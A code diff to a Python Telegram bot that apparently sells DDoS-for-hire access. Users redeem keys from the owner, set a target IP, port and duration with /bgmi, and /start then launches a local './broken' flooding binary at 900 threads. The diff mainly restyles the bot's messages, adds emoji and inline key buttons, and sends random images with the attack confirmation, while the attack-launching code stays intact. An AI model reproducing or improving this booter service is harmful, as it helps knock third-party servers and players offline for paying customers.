@@ -4,8 +4,8 @@ import os
 import random
 import string
 import datetime
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 from telegram import ReplyKeyboardMarkup, KeyboardButton
 
@@ -16,6 +16,14 @@ flooding_command = None
 DEFAULT_THREADS = 900
 users = {}
 keys = {}
+
+# Predefined list of image URLs (replace with your URLs)
+IMAGE_URLS = [
+    "https://t.me/jwhu7hwbsnn/166?single",  # Replace with real image URLs
+    "https://t.me/jwhu7hwbsnn/122",
+    "https://t.me/jwhu7hwbsnn/122",
+    "https://t.me/jwhu7hwbsnn/122"
+]
 
 def load_data():
     global users, keys
@@ -74,15 +82,31 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 key = generate_key()
                 keys[key] = expiration_date
                 save_keys()
-                response = f"KEY GENERATED\n\nYOUR KEY: {key}\n\nVALIDITY: {expiration_date}\n\nREDEEM YOUR KEY: /redeem"
+
+                # Create inline button with the generated key
+                keyboard = [
+                    [InlineKeyboardButton(f"Copy Key: {key}", callback_data=key)]  # Button with key text
+                ]
+                markup = InlineKeyboardMarkup(keyboard)
+
+                response = f"?? **KEY GENERATED**\n\n**YOUR KEY**: `{key}`\n\n**VALIDITY**: `{expiration_date}`\n\nRedeem your key using: `/redeem`"
+                await update.message.reply_text(response, reply_markup=markup)
             except ValueError:
                 response = f"USAGE /genkey 1 HOURS and DAYS"
         else:
             response = "USAGE /genkey 1 HOURS and DAYS"
     else:
-        response = "❌ ACCESS DENIED. CONTACT TO OWNER - @GODxAloneBOY"
+        response = "❌ ACCESS DENIED. CONTACT OWNER - @GODxAloneBOY"
 
     await update.message.reply_text(response)
+
+# Callback query handler for the inline button press
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    key = query.data  # The key is sent as callback_data
+    # Send the key as a message to the user
+    await query.answer()  # Acknowledge the callback
+    await query.message.reply_text(f"?? **YOUR KEY**: `{key}`")
 
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
@@ -100,11 +124,11 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_users()
             del keys[key]
             save_keys()
-            response = f"KEY REDEEMED SUCCESSFULLY"
+            response = f"✅ **KEY REDEEMED SUCCESSFULLY**"
         else:
-            response = f"BOT OWNER - @GODxAloneBOY"
+            response = f"✨ **INVALID KEY!** Contact the BOT OWNER: @GODxAloneBOY"
     else:
-        response = f"USE COMMAND TO REDEEM KEY: /redeem"
+        response = f"❌ **USAGE**: `/redeem <key>`"
 
     await update.message.reply_text(response)
 
@@ -117,7 +141,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if len(context.args) != 3:
-        await update.message.reply_text('EXAMPLE USE /bgmi «IP» «PORT» «DURATION»')
+        await update.message.reply_text('⚠️ **EXAMPLE USE**: `/bgmi <IP> <PORT> <DURATION>`')
         return
 
     target_ip = context.args[0]
@@ -125,63 +149,90 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     duration = context.args[2]
 
     flooding_command = ['./broken', target_ip, port, duration, str(DEFAULT_THREADS)]
-    await update.message.reply_text(f'TARGET SET\n\nTARGET IP: {target_ip}\nPORT: {port}\nDURATION: {duration}\n\nTAP TO START ATTACK BUTTON')
+    
+    # Select a random image URL
+    random_image = random.choice(IMAGE_URLS)
+
+    # Send image and attack setup message together
+    await update.message.reply_photo(
+        photo=random_image, 
+        caption=(
+            f"✅ **TARGET SET**\n\n"
+            f"**TARGET IP**: `{target_ip}`\n"
+            f"**PORT**: `{port}`\n"
+            f"**DURATION**: `{duration}`\n\n"
+            "🛑 Press **/start** to begin the attack."
+        )
+    )
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global flooding_process, flooding_command
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("TAP TO COMMAND. /alone\n\nJOIN TELEGRAM - https://t.me/+03wLVBPurPk2NWRl")
+        await update.message.reply_text("❌ **ACCESS DENIED**: You need to contact the owner @GODxAloneBOY for permission.")
         return
 
     if flooding_process is not None:
-        await update.message.reply_text('ATTACK PENDING\n\nUSE COMMAND TO STOP /stop')
+        await update.message.reply_text('⚠️ **ATTACK PENDING**\nUse **/stop** to stop the current attack.')
         return
 
     if flooding_command is None:
-        await update.message.reply_text('USE COMMAND TO SET TARGET /alone\n\nCONTACT BOT OWNER- @GODxAloneBOY')
+        await update.message.reply_text('⚠️ **TARGET NOT SET**: Use **/bgmi** to set a target first.')
         return
 
+    # Get user details
+    username = update.message.from_user.username
+
     flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text('ATTACK STARTED\nJOIN MY TELEGRAM CHANNEL\nSEND FEEDBACK TO OWNER @GODxAloneBOY\n\n🇮🇳 https://t.me/+03wLVBPurPk2NWRl')
+    
+    # Send attack start message with all details including IP, Port, Duration, and Username
+    await update.message.reply_text(
+        f"✅ **ATTACK STARTED!**\n\n"
+        f"**TARGET IP**: `{flooding_command[1]}`\n"
+        f"**PORT**: `{flooding_command[2]}`\n"
+        f"**DURATION**: `{flooding_command[3]}`\n"
+        f"**USERNAME**: @{username}\n"
+        f"\nSend feedback to the owner @GODxAloneBOY."
+    )
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global flooding_process
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("TAP TO COMMAND /alone\n\nJOIN MY TELEGRAM CHANNEL- https://t.me/+03wLVBPurPk2NWRl")
+        await update.message.reply_text("❌ **ACCESS DENIED**: You need to contact the owner @GODxAloneBOY for permission.")
         return
 
     if flooding_process is None:
-        await update.message.reply_text('ERROR. ATTACK IS NOT RUNNING')
+        await update.message.reply_text('❌ **ERROR**: Attack is not running.')
         return
 
     flooding_process.terminate()
     flooding_process = None
-    await update.message.reply_text('ATTACK STOPPED\n\nUSE COMMAND TO RESTART ATTACK /start')
+    await update.message.reply_text('🛑 **ATTACK STOPPED**\nUse **/start** to restart the attack.')
 
-# Update the alone_command function to include buttons
+# Update the alone_command function to include buttons with emojis
 async def alone_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    # Create buttons
+    # Create buttons with emojis
     markup = ReplyKeyboardMarkup(
         [
-            [KeyboardButton("/bgmi"), KeyboardButton("/start")],
-            [KeyboardButton("/stop")]
+            [KeyboardButton("/bgmi 🎯"), KeyboardButton("/start 🚀")],
+            [KeyboardButton("/stop ❌")]
         ],
-        resize_keyboard=False
+        resize_keyboard=True  # Set this to True to automatically resize buttons
     )
     
     response = (
-        "ALL COMMANDS\n\n"
-        "/genkey-> FOR GENERATE KEY\n"
-        "/redeem-> FOR REDEEM KEY\n"
-        "/bgmi-> FOR ATTACK TARGET SET\n"
-        "/start-> FOR ATTACK START\n"
-        "/stop-> FOR ATTACK STOP\n\n"
-        f"✅OWNER-> {OWNER_USERNAME}"
-    ) # Send message with the keyboard buttons
+        "✌️ **ALL COMMANDS** ✌️\n\n"
+        "🔑 **/genkey** -> FOR GENERATING A KEY\n"
+        "♦️ **/redeem** -> FOR REDEEMING A KEY\n"
+        "🎯 **/bgmi** -> TO SET ATTACK TARGET\n"
+        "✅ **/start** -> TO START THE ATTACK\n"
+        "🛑 **/stop** -> TO STOP THE ATTACK\n\n"
+        f"🎁 OWNER: {OWNER_USERNAME}\n\n"
+        "👍 Send your feedback or requests to the owner!"
+    )  # Send message with the keyboard buttons
     await update.message.reply_text(response, reply_markup=markup)
 
 def main() -> None:
